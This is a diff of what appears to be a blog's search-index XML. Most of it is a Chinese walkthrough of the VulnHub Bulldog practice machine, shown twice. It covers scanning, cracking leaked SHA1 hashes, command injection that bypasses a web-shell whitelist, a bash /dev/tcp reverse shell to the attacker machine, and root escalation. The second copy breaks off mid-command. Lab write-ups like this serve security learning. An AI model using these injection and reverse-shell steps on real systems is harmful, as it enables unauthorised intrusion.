</code></pre><p>defined的用法</p><p>函数defined返回0、false或者非0、true。<br>此运算结果依赖于传递给它进行计算的参数的内容。<br>如果参数中不含有字符和数字值，则返回0；如果参数中包含一个字符或者数字值，则返回非0或者true值。<br>这对于判断一个已经建立的数组中的每个元素是否已经定义非常有用。</p><p>注意：此函数作用不是判断某个变量是否已经定义，而是用来判断某个变量是否为空。 </p>]]></content>
-      
-      
-      <categories>
-          
-          <category> linux </category>
-          
-          <category> shell </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> perl </tag>
             
         </tags>
       
@@ -1330,31 +1330,6 @@
     
     
     <entry>
-      <title>在vmware上访问virtualbox的虚拟机</title>
-      <link href="2020/08/11/2020-08-11-vmware_virtualbox_connect/"/>
-      <url>2020/08/11/2020-08-11-vmware_virtualbox_connect/</url>
-      
-        <content type="html"><![CDATA[<p>问题描述：</p><p>最近要复现一个靶机，但是这个靶机只能在virtualbox上打开，可是我的kali安装在vmware上，想直接在kali上对靶机进行渗透攻击，可是kali和靶机并不在同一个网段。</p><p>解决方法</p><p>首先打开vmware，点击编辑里面的虚拟网络编辑器。点击更改配置。将网卡桥接到主机网卡上</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/vmware_virtualbox_connect_1.png"></p><p>然后打开virtualbox，将网络也桥接到主机网卡上</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/vmware_virtualbox_connect_2.png"></p><p>打开虚拟机，可以看到已经成功的和靶机在一个网段里面了，可以ping通。</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/vmware_virtualbox_connect_3.png"></p>]]></content>
-      
-      
-      <categories>
-          
-          <category> others </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> vmware </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>linux 网卡 device not managed 错误</title>
       <link href="2020/08/11/2020-08-11-linux_network_device_not_managed/"/>
       <url>2020/08/11/2020-08-11-linux_network_device_not_managed/</url>
@@ -1380,11 +1355,36 @@
     
     
     <entry>
+      <title>在vmware上访问virtualbox的虚拟机</title>
+      <link href="2020/08/11/2020-08-11-vmware_virtualbox_connect/"/>
+      <url>2020/08/11/2020-08-11-vmware_virtualbox_connect/</url>
+      
+        <content type="html"><![CDATA[<p>问题描述：</p><p>最近要复现一个靶机，但是这个靶机只能在virtualbox上打开，可是我的kali安装在vmware上，想直接在kali上对靶机进行渗透攻击，可是kali和靶机并不在同一个网段。</p><p>解决方法</p><p>首先打开vmware，点击编辑里面的虚拟网络编辑器。点击更改配置。将网卡桥接到主机网卡上</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/vmware_virtualbox_connect_1.png"></p><p>然后打开virtualbox，将网络也桥接到主机网卡上</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/vmware_virtualbox_connect_2.png"></p><p>打开虚拟机，可以看到已经成功的和靶机在一个网段里面了，可以ping通。</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/vmware_virtualbox_connect_3.png"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> others </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> vmware </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>VulnHub靶机BullDog实战</title>
       <link href="2020/08/11/2020-08-11-vulnhub_bulldog/"/>
       <url>2020/08/11/2020-08-11-vulnhub_bulldog/</url>
       
-        <content type="html"><![CDATA[<p>作为一名渗透测试行业的菜鸟，一直没有找到好的靶场来进行练习，最近了解到Vnluhub（<a href="http://www.vulnhub.com)./">www.vulnhub.com）。</a></p><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><pre><code>*靶机难度：初学者/中级*目标：提权到root权限并查看flag*攻击机：kali linux，IP地址192.168.15.121*靶机：bulldog，IP地址192.168.15.129（下载地址：https://download.vulnhub.com/bulldog/bulldog.ova）*运行环境：kali运行在VMware中，靶机在Virtualbox中</code></pre><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>bulldog在开机时界面上已经有一个IP地址</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/vulnhub_bulldog_1.png"></p><p>但还是熟悉下nmap扫描 </p><h3 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h3><pre><code>nmap -sP 192.168.15.0/24.....Nmap scan report for bulldog.nthome.org (192.168.15.129)Host is up (0.00012s latency).MAC Address: 08:00:27:16:1D:5F (Oracle VirtualBox virtual NIC).....</code></pre><h3 id="信息扫描"><a href="#信息扫描" class="headerlink" title="信息扫描"></a>信息扫描</h3><pre><code>nmap -A 192.168.15.129Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-10 13:11 EDTNmap scan report for bulldog.nthome.org (192.168.15.129)Host is up (0.00044s latency).Not shown: 997 closed portsPORT     STATE SERVICE VERSION23/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 20:8b:fc:9e:d9:2e:28:22:6b:2e:0e:e3:72:c5:bb:52 (RSA)|   256 cd:bd:45:d8:5c:e4:8c:b6:91:e5:39:a9:66:cb:d7:98 (ECDSA)|_  256 2f:ba:d5:e5:9f:a2:43:e5:3b:24:2c:10:c2:0a:da:66 (ED25519)80/tcp   open  http    WSGIServer 0.1 (Python 2.7.12)|_http-server-header: WSGIServer/0.1 Python/2.7.12|_http-title: Bulldog Industries8080/tcp open  http    WSGIServer 0.1 (Python 2.7.12)|_http-server-header: WSGIServer/0.1 Python/2.7.12|_http-title: Bulldog IndustriesMAC Address: 08:00:27:16:1D:5F (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT     ADDRESS1   0.44 ms bulldog.nthome.org (192.168.15.129)OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 16.67 seconds</code></pre><h3 id="漏洞挖掘的详细思路"><a href="#漏洞挖掘的详细思路" class="headerlink" title="漏洞挖掘的详细思路"></a>漏洞挖掘的详细思路</h3><p>web漏洞思路：</p><p>(1) 查看每个网页的源码，看是否有提示；</p><p>(2) 暴破目录，用DirBuster，看是否有新网页，找新网页的漏洞；</p><p>(3) 找注入或框架漏洞：如果网页有输入框、URL参数，可AWVS扫描注入；如果web使用了某些CMS框架，只能找框架的通用漏洞，通常扫描不到注入。</p><p>ssh利用思路：</p><p>(1) 如得到用户名，可以用就九头蛇或美杜莎暴破弱口令，但需要强大的字典且有弱口令。</p><p>(2) 如果得到web管理或系统账号，可以尝试连接ssh，如能连接上，无需反弹shell了。</p><h3 id="查看web服务"><a href="#查看web服务" class="headerlink" title="查看web服务"></a>查看web服务</h3><p>访问此地址 bulldog.nthome.org (192.168.15.129) 看看</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/vulnhub_bulldog_2.png"></p><p>主要是说被黑客攻击，然后下面有个通告 Public Notice链接</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/vulnhub_bulldog_3.png"></p><p>打开是CEO写给客户的信，也没什么重要信息。因此，我们使用dirb查找目录以获取更多信息。</p><h3 id="浏览网页，爆破目录"><a href="#浏览网页，爆破目录" class="headerlink" title="浏览网页，爆破目录"></a>浏览网页，爆破目录</h3><p>在kali中打开命令终端，输入</p><pre><code>dirb http://192.168.15.129</code></pre><p>结果如下</p><pre><code>-----------------DIRB v2.22    By The Dark Raver-----------------START_TIME: Mon Aug 10 11:23:26 2020URL_BASE: http://192.168.15.129/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt-----------------GENERATED WORDS: 4612                                                          ---- Scanning URL: http://192.168.15.129/ ----==&gt; DIRECTORY: http://192.168.15.129/admin/                                                                       ==&gt; DIRECTORY: http://192.168.15.129/dev/                                                                         + http://192.168.15.129/robots.txt (CODE:200|SIZE:1071)                                                           ---- Entering directory: http://192.168.15.129/admin/ ----==&gt; DIRECTORY: http://192.168.15.129/admin/auth/                                                                  ==&gt; DIRECTORY: http://192.168.15.129/admin/login/                                                                 ==&gt; DIRECTORY: http://192.168.15.129/admin/logout/                                                                ---- Entering directory: http://192.168.15.129/dev/ ----==&gt; DIRECTORY: http://192.168.15.129/dev/shell/                                                                   ---- Entering directory: http://192.168.15.129/admin/auth/ ----==&gt; DIRECTORY: http://192.168.15.129/admin/auth/group/                                                            ==&gt; DIRECTORY: http://192.168.15.129/admin/auth/user/                                                             ---- Entering directory: http://192.168.15.129/admin/login/ -------- Entering directory: http://192.168.15.129/admin/logout/ -------- Entering directory: http://192.168.15.129/dev/shell/ -------- Entering directory: http://192.168.15.129/admin/auth/group/ ----(!) WARNING: NOT_FOUND[] not stable, unable to determine correct URLs &#123;30X&#125;.    (Try using FineTunning: &#39;-f&#39;)---- Entering directory: http://192.168.15.129/admin/auth/user/ ----(!) WARNING: NOT_FOUND[] not stable, unable to determine correct URLs &#123;30X&#125;.    (Try using FineTunning: &#39;-f&#39;)-----------------END_TIME: Mon Aug 10 11:25:29 2020DOWNLOADED: 32284 - FOUND: 1</code></pre><p>发现有两个主目录，一个是admin，一个是dev</p><p>分别查看</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/vulnhub_bulldog_4.png"></p><p>admin 是一个登录界面，可是我们没有用户名和密码。难道要用burp爆破一下？等会再说，而且还有dirb里扫描出的一个链接没打开，现在先看看当前页面的源代码，没啥有用的，看看扫描出的另一链接</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/vulnhub_bulldog_5.png"></p><p>dev 是一个介绍，主要说新的系统是用Django语言编写并且启用了SSH，完全删除了PHP。新系统不再使用php或任何CMS，而是使用Django框架开发。这意味着不太可能再找到网页的注入漏洞，只能找Django框架漏洞；网站不使用php，无需再找php漏洞或者写php木马；</p><p>页面中间有一个Web-Shell链接，点进去看下，有提示，需要认证</p><pre><code>Please authenticate with the server to use Web-Shell</code></pre><p>一般来说web shell是能为我们所用的，但是现在提示与服务器进行身份验证才能使用web shell。那好吧，看看源代码</p><p>查看源代码，看到</p><pre><code>&lt;p&gt;&lt;font size=&quot;6em&quot;&gt;&lt;center&gt;&lt;a href=&quot;/dev/shell&quot; style=&quot;color:blue&quot;&gt;Web-Shell&lt;/a&gt;&lt;/center&gt;&lt;/font&gt;&lt;/p&gt;    &lt;b&gt;Who do I talk to to get started?&lt;/b&gt;&lt;br&gt;&lt;br&gt;    &lt;!--Need these password hashes for testing. Django&#39;s default is too complex--&gt;    &lt;!--We&#39;ll remove these in prod. It&#39;s not like a hacker can do anything with a hash--&gt;    Team Lead: alan@bulldogindustries.com&lt;br&gt;&lt;!--6515229daf8dbdc8b89fed2e60f107433da5f2cb--&gt;    Back-up Team Lead: william@bulldogindustries.com&lt;br&gt;&lt;br&gt;&lt;!--38882f3b81f8f2bc47d9f3119155b05f954892fb--&gt;    Front End: malik@bulldogindustries.com&lt;br&gt;&lt;!--c6f7e34d5d08ba4a40dd5627508ccb55b425e279--&gt;    Front End: kevin@bulldogindustries.com&lt;br&gt;&lt;br&gt;&lt;!--0e6ae9fe8af1cd4192865ac97ebf6bda414218a9--&gt;    Back End: ashley@bulldogindustries.com&lt;br&gt;&lt;!--553d917a396414ab99785694afd51df3a8a8a3e0--&gt;    Back End: nick@bulldogindustries.com&lt;br&gt;&lt;br&gt;&lt;!--ddf45997a7e18a25ad5f5cf222da64814dd060d5--&gt;    Database: sarah@bulldogindustries.com&lt;br&gt;&lt;!--d8b8dd5e7f000b8dea26ef8428caf38c04466b3e--&gt;</code></pre><h3 id="破解hash"><a href="#破解hash" class="headerlink" title="破解hash"></a>破解hash</h3><p>40位hash值，猜测是sha1，猜测可能是前面开发人员的账号密码，即使不知道是哪种hash，也可以把每个hash值找在线工具CMD5解密一下，解出两个</p><pre><code>ddf45997a7e18a25ad5f5cf222da64814dd060d5 -&gt; bulldogd8b8dd5e7f000b8dea26ef8428caf38c04466b3e -&gt; bulldoglover</code></pre><h3 id="登录后台"><a href="#登录后台" class="headerlink" title="登录后台"></a>登录后台</h3><p>(1) 使用解密出来的密码尝试登录扫描出来的23端口ssh都失败：</p><p>(2) 使用sarah、密码bulldoglover成功登录管理后台，发现没有编辑权限。</p><p>去 admin 页面登陆试试</p><p>尝试使用用户名<a href="mailto:&#110;&#105;&#99;&#107;&#64;&#x62;&#x75;&#108;&#x6c;&#100;&#111;&#x67;&#105;&#x6e;&#x64;&#117;&#x73;&#x74;&#x72;&#x69;&#101;&#x73;&#46;&#x63;&#x6f;&#109;">&#110;&#105;&#99;&#107;&#64;&#x62;&#x75;&#108;&#x6c;&#100;&#111;&#x67;&#105;&#x6e;&#x64;&#117;&#x73;&#x74;&#x72;&#x69;&#101;&#x73;&#46;&#x63;&#x6f;&#109;</a>和sarah@bulldogindustries.com和对应的密码bulldog和bulldoglover登陆，发现登陆不了。</p><p>然后尝试使用nick和bulldog登陆，发现可以登陆。</p><p>进去之后发现都没有权限。</p><pre><code>You don&#39;t have permission to edit anything.</code></pre><p>现在我们找到了两组用户名和密码，记下来可能等会要用</p><pre><code>nick---bulldogsarah---bulldoglover</code></pre><p>(3) 再去访问webshell页面，已通过认证，可执行命令，这是一个命令执行界面：</p><p>想到之前那个webshell，需要认证后使用，我们登陆后查看shell页面，果然可以使用了</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/vulnhub_bulldog_6.png"></p><p>不过好像只能用系统给出的几个命令。先试一下有没有命令注入</p><h3 id="绕过白名单限制进行命令注入、shell反弹"><a href="#绕过白名单限制进行命令注入、shell反弹" class="headerlink" title="绕过白名单限制进行命令注入、shell反弹"></a>绕过白名单限制进行命令注入、shell反弹</h3><p>在输入框里输入 ifconfig &amp; whoami</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/vulnhub_bulldog_7.png"></p><p>根据反馈结果判断存在命令注入，那接下来就好办了。</p><p>在攻击机kali中打开命令终端开始监听，输入nc -lvnp 6666</p><p>尝试bash反弹，在靶机打开的网页命令框中输入</p><pre><code>bash -i &gt;&amp; /dev/tcp/192.168.15.121/6666 0&gt;&amp;1</code></pre><p>结果返回</p><pre><code>Command : nc -lvnp 6666INVALID COMMAND. I CAUGHT YOU HACKER!</code></pre><p>换一种方式</p><pre><code>ls &amp;bash -i &gt;&amp; /dev/tcp/192.168.15.121/6666 0&gt;&amp;1</code></pre><p>服务器报错500。</p><p>多次尝试之后，使用echo命令反弹shell成功</p><pre><code>echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.15.121/6666 0&gt;&amp;1&quot; | bash</code></pre><p>接下来就是提权了</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/vulnhub_bulldog_8.png"></p><h3 id="root提权"><a href="#root提权" class="headerlink" title="root提权"></a>root提权</h3><p>首先查看有哪些系统用户</p><pre><code>cat /etc/passwd</code></pre><p>发现了一个重点对象</p><pre><code>bulldogadmin</code></pre><p>然后，查找他的文件  </p><pre><code>find / -user bulldogadmin 2&gt;/dev/null</code></pre><p>发现有hiddenadmindirectory隐藏目录，用less命令打开里面包含的文件看看</p><pre><code>less /home/bulldogadmin/.hiddenadmindirectory/note</code></pre><p>同样的方式打开另一个文件查看一下</p><pre><code>less /home/bulldogadmin/.hiddenadmindirectory/customPermissionApp</code></pre><p>发现customPermissionApp里面包含的都是字符，输入命令</p><pre><code>strings /home/bulldogadmin/.hiddenadmindirectory/customPermissionApp     </code></pre><p>查看此文件</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/vulnhub_bulldog_9.png"></p><p>很轻松地看出文件中间有一个被 H 打断的PASSWORD单词。于是把前后字段去掉H，得到一句</p><pre><code>SUPERultimatePASSWORDyouCANTget   </code></pre><p>把它保存着，这可能是我们会要用到的密码</p><p>su命令执行一下</p><pre><code>su: must be run from a terminal 需要一个终端</code></pre><p>上网查了一下资料，可以用python调用本地的shell，命令：</p><pre><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p>然后执行命令</p><pre><code>sudo su -</code></pre><p>输入刚才记下来的的密码试一下，结果成功获得root权限</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/vulnhub_bulldog_10.png"></p><p>输入ls命令，发现里面只有一个文本文档 congrats.txt</p><p>输入</p><pre><code>cat congrats.txt</code></pre><p>打开看下</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/vulnhub_bulldog_11.png"></p><p>如果无法解决su，还记得有23端口的ssh，也可以使用Xshell通过ssh登录，登录成功后执行sudo su – 提权并获得flag</p><p>成功完成了Bulldog靶机实战</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>(1) 发现和破解sha1：在dev页面查看源码，发现多个用户hash后，即使不知道是40位的sha1，也可以直接去cmd5破解，系统会自动识别，可以破解出2个账号。如果用hashcat暴破sha1，需要强大的字段和较长的时间。</p><p>(2) 反弹shell应该有多种方法：第一个想到的是bash shell，也想到了python反弹shell。只尝试了通过bash反弹shell，如果bash反弹不成功，可尝试往系统echo文件，赋予+x执行权限，执行脚本反弹。也可尝试Python是否能够反弹shell。</p><p>(3) 发现隐藏的包含root密码的文件，通过搜索id为1000之后的用户文件，查看历史命令，或者查看目录，也可能找到。</p><p>(4) 猜解root密码：这个是最难的，找到这个文件并不难，但是通过strings查看文件内容，并且拼接字符串为root密码，感觉难度很大。</p>]]></content>
+        <content type="html"><![CDATA[<p>作为一名渗透测试行业的菜鸟，一直没有找到好的靶场来进行练习，最近了解到Vnluhub（<a href="http://www.vulnhub.com)./">www.vulnhub.com）。</a></p><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><pre><code>*靶机难度：初学者/中级*目标：提权到root权限并查看flag*攻击机：kali linux，IP地址192.168.15.121*靶机：bulldog，IP地址192.168.15.129（下载地址：https://download.vulnhub.com/bulldog/bulldog.ova）*运行环境：kali运行在VMware中，靶机在Virtualbox中</code></pre><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>bulldog在开机时界面上已经有一个IP地址</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/vulnhub_bulldog_1.png"></p><p>但还是熟悉下nmap扫描 </p><h3 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h3><pre><code>nmap -sP 192.168.15.0/24.....Nmap scan report for bulldog.nthome.org (192.168.15.129)Host is up (0.00012s latency).MAC Address: 08:00:27:16:1D:5F (Oracle VirtualBox virtual NIC).....</code></pre><h3 id="信息扫描"><a href="#信息扫描" class="headerlink" title="信息扫描"></a>信息扫描</h3><pre><code>nmap -A 192.168.15.129Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-10 13:11 EDTNmap scan report for bulldog.nthome.org (192.168.15.129)Host is up (0.00044s latency).Not shown: 997 closed portsPORT     STATE SERVICE VERSION23/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 20:8b:fc:9e:d9:2e:28:22:6b:2e:0e:e3:72:c5:bb:52 (RSA)|   256 cd:bd:45:d8:5c:e4:8c:b6:91:e5:39:a9:66:cb:d7:98 (ECDSA)|_  256 2f:ba:d5:e5:9f:a2:43:e5:3b:24:2c:10:c2:0a:da:66 (ED25519)80/tcp   open  http    WSGIServer 0.1 (Python 2.7.12)|_http-server-header: WSGIServer/0.1 Python/2.7.12|_http-title: Bulldog Industries8080/tcp open  http    WSGIServer 0.1 (Python 2.7.12)|_http-server-header: WSGIServer/0.1 Python/2.7.12|_http-title: Bulldog IndustriesMAC Address: 08:00:27:16:1D:5F (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT     ADDRESS1   0.44 ms bulldog.nthome.org (192.168.15.129)OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 16.67 seconds</code></pre><h3 id="漏洞挖掘的详细思路"><a href="#漏洞挖掘的详细思路" class="headerlink" title="漏洞挖掘的详细思路"></a>漏洞挖掘的详细思路</h3><p>web漏洞思路：</p><p>(1) 查看每个网页的源码，看是否有提示；</p><p>(2) 暴破目录，用DirBuster，看是否有新网页，找新网页的漏洞；</p><p>(3) 找注入或框架漏洞：如果网页有输入框、URL参数，可AWVS扫描注入；如果web使用了某些CMS框架，只能找框架的通用漏洞，通常扫描不到注入。</p><p>ssh利用思路：</p><p>(1) 如得到用户名，可以用就九头蛇或美杜莎暴破弱口令，但需要强大的字典且有弱口令。</p><p>(2) 如果得到web管理或系统账号，可以尝试连接ssh，如能连接上，无需反弹shell了。</p><h3 id="查看web服务"><a href="#查看web服务" class="headerlink" title="查看web服务"></a>查看web服务</h3><p>访问此地址 bulldog.nthome.org (192.168.15.129) 看看</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/vulnhub_bulldog_2.png"></p><p>主要是说被黑客攻击，然后下面有个通告 Public Notice链接</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/vulnhub_bulldog_3.png"></p><p>打开是CEO写给客户的信，也没什么重要信息。因此，我们使用dirb查找目录以获取更多信息。</p><h3 id="浏览网页，爆破目录"><a href="#浏览网页，爆破目录" class="headerlink" title="浏览网页，爆破目录"></a>浏览网页，爆破目录</h3><p>在kali中打开命令终端，输入</p><pre><code>dirb http://192.168.15.129</code></pre><p>结果如下</p><pre><code>-----------------DIRB v2.22    By The Dark Raver-----------------START_TIME: Mon Aug 10 11:23:26 2020URL_BASE: http://192.168.15.129/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt-----------------GENERATED WORDS: 4612                                                          ---- Scanning URL: http://192.168.15.129/ ----==&gt; DIRECTORY: http://192.168.15.129/admin/                                                                       ==&gt; DIRECTORY: http://192.168.15.129/dev/                                                                         + http://192.168.15.129/robots.txt (CODE:200|SIZE:1071)                                                           ---- Entering directory: http://192.168.15.129/admin/ ----==&gt; DIRECTORY: http://192.168.15.129/admin/auth/                                                                  ==&gt; DIRECTORY: http://192.168.15.129/admin/login/                                                                 ==&gt; DIRECTORY: http://192.168.15.129/admin/logout/                                                                ---- Entering directory: http://192.168.15.129/dev/ ----==&gt; DIRECTORY: http://192.168.15.129/dev/shell/                                                                   ---- Entering directory: http://192.168.15.129/admin/auth/ ----==&gt; DIRECTORY: http://192.168.15.129/admin/auth/group/                                                            ==&gt; DIRECTORY: http://192.168.15.129/admin/auth/user/                                                             ---- Entering directory: http://192.168.15.129/admin/login/ -------- Entering directory: http://192.168.15.129/admin/logout/ -------- Entering directory: http://192.168.15.129/dev/shell/ -------- Entering directory: http://192.168.15.129/admin/auth/group/ ----(!) WARNING: NOT_FOUND[] not stable, unable to determine correct URLs &#123;30X&#125;.    (Try using FineTunning: &#39;-f&#39;)---- Entering directory: http://192.168.15.129/admin/auth/user/ ----(!) WARNING: NOT_FOUND[] not stable, unable to determine correct URLs &#123;30X&#125;.    (Try using FineTunning: &#39;-f&#39;)-----------------END_TIME: Mon Aug 10 11:25:29 2020DOWNLOADED: 32284 - FOUND: 1</code></pre><p>发现有两个主目录，一个是admin，一个是dev</p><p>分别查看</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/vulnhub_bulldog_4.png"></p><p>admin 是一个登录界面，可是我们没有用户名和密码。难道要用burp爆破一下？等会再说，而且还有dirb里扫描出的一个链接没打开，现在先看看当前页面的源代码，没啥有用的，看看扫描出的另一链接</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/vulnhub_bulldog_5.png"></p><p>dev 是一个介绍，主要说新的系统是用Django语言编写并且启用了SSH，完全删除了PHP。新系统不再使用php或任何CMS，而是使用Django框架开发。这意味着不太可能再找到网页的注入漏洞，只能找Django框架漏洞；网站不使用php，无需再找php漏洞或者写php木马；</p><p>页面中间有一个Web-Shell链接，点进去看下，有提示，需要认证</p><pre><code>Please authenticate with the server to use Web-Shell</code></pre><p>一般来说web shell是能为我们所用的，但是现在提示与服务器进行身份验证才能使用web shell。那好吧，看看源代码</p><p>查看源代码，看到</p><pre><code>&lt;p&gt;&lt;font size=&quot;6em&quot;&gt;&lt;center&gt;&lt;a href=&quot;/dev/shell&quot; style=&quot;color:blue&quot;&gt;Web-Shell&lt;/a&gt;&lt;/center&gt;&lt;/font&gt;&lt;/p&gt;    &lt;b&gt;Who do I talk to to get started?&lt;/b&gt;&lt;br&gt;&lt;br&gt;    &lt;!--Need these password hashes for testing. Django&#39;s default is too complex--&gt;    &lt;!--We&#39;ll remove these in prod. It&#39;s not like a hacker can do anything with a hash--&gt;    Team Lead: alan@bulldogindustries.com&lt;br&gt;&lt;!--6515229daf8dbdc8b89fed2e60f107433da5f2cb--&gt;    Back-up Team Lead: william@bulldogindustries.com&lt;br&gt;&lt;br&gt;&lt;!--38882f3b81f8f2bc47d9f3119155b05f954892fb--&gt;    Front End: malik@bulldogindustries.com&lt;br&gt;&lt;!--c6f7e34d5d08ba4a40dd5627508ccb55b425e279--&gt;    Front End: kevin@bulldogindustries.com&lt;br&gt;&lt;br&gt;&lt;!--0e6ae9fe8af1cd4192865ac97ebf6bda414218a9--&gt;    Back End: ashley@bulldogindustries.com&lt;br&gt;&lt;!--553d917a396414ab99785694afd51df3a8a8a3e0--&gt;    Back End: nick@bulldogindustries.com&lt;br&gt;&lt;br&gt;&lt;!--ddf45997a7e18a25ad5f5cf222da64814dd060d5--&gt;    Database: sarah@bulldogindustries.com&lt;br&gt;&lt;!--d8b8dd5e7f000b8dea26ef8428caf38c04466b3e--&gt;</code></pre><h3 id="破解hash"><a href="#破解hash" class="headerlink" title="破解hash"></a>破解hash</h3><p>40位hash值，猜测是sha1，猜测可能是前面开发人员的账号密码，即使不知道是哪种hash，也可以把每个hash值找在线工具CMD5解密一下，解出两个</p><pre><code>ddf45997a7e18a25ad5f5cf222da64814dd060d5 -&gt; bulldogd8b8dd5e7f000b8dea26ef8428caf38c04466b3e -&gt; bulldoglover</code></pre><h3 id="登录后台"><a href="#登录后台" class="headerlink" title="登录后台"></a>登录后台</h3><p>(1) 使用解密出来的密码尝试登录扫描出来的23端口ssh都失败：</p><p>(2) 使用sarah、密码bulldoglover成功登录管理后台，发现没有编辑权限。</p><p>去 admin 页面登陆试试</p><p>尝试使用用户名<a href="mailto:&#110;&#x69;&#x63;&#x6b;&#x40;&#98;&#117;&#x6c;&#108;&#x64;&#111;&#x67;&#x69;&#x6e;&#100;&#x75;&#115;&#116;&#x72;&#105;&#x65;&#115;&#x2e;&#x63;&#111;&#x6d;">&#110;&#x69;&#x63;&#x6b;&#x40;&#98;&#117;&#x6c;&#108;&#x64;&#111;&#x67;&#x69;&#x6e;&#100;&#x75;&#115;&#116;&#x72;&#105;&#x65;&#115;&#x2e;&#x63;&#111;&#x6d;</a>和sarah@bulldogindustries.com和对应的密码bulldog和bulldoglover登陆，发现登陆不了。</p><p>然后尝试使用nick和bulldog登陆，发现可以登陆。</p><p>进去之后发现都没有权限。</p><pre><code>You don&#39;t have permission to edit anything.</code></pre><p>现在我们找到了两组用户名和密码，记下来可能等会要用</p><pre><code>nick---bulldogsarah---bulldoglover</code></pre><p>(3) 再去访问webshell页面，已通过认证，可执行命令，这是一个命令执行界面：</p><p>想到之前那个webshell，需要认证后使用，我们登陆后查看shell页面，果然可以使用了</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/vulnhub_bulldog_6.png"></p><p>不过好像只能用系统给出的几个命令。先试一下有没有命令注入</p><h3 id="绕过白名单限制进行命令注入、shell反弹"><a href="#绕过白名单限制进行命令注入、shell反弹" class="headerlink" title="绕过白名单限制进行命令注入、shell反弹"></a>绕过白名单限制进行命令注入、shell反弹</h3><p>在输入框里输入 ifconfig &amp; whoami</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/vulnhub_bulldog_7.png"></p><p>根据反馈结果判断存在命令注入，那接下来就好办了。</p><p>在攻击机kali中打开命令终端开始监听，输入nc -lvnp 6666</p><p>尝试bash反弹，在靶机打开的网页命令框中输入</p><pre><code>bash -i &gt;&amp; /dev/tcp/192.168.15.121/6666 0&gt;&amp;1</code></pre><p>结果返回</p><pre><code>Command : nc -lvnp 6666INVALID COMMAND. I CAUGHT YOU HACKER!</code></pre><p>换一种方式</p><pre><code>ls &amp;bash -i &gt;&amp; /dev/tcp/192.168.15.121/6666 0&gt;&amp;1</code></pre><p>服务器报错500。</p><p>多次尝试之后，使用echo命令反弹shell成功</p><pre><code>echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.15.121/6666 0&gt;&amp;1&quot; | bash</code></pre><p>接下来就是提权了</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/vulnhub_bulldog_8.png"></p><h3 id="root提权"><a href="#root提权" class="headerlink" title="root提权"></a>root提权</h3><p>首先查看有哪些系统用户</p><pre><code>cat 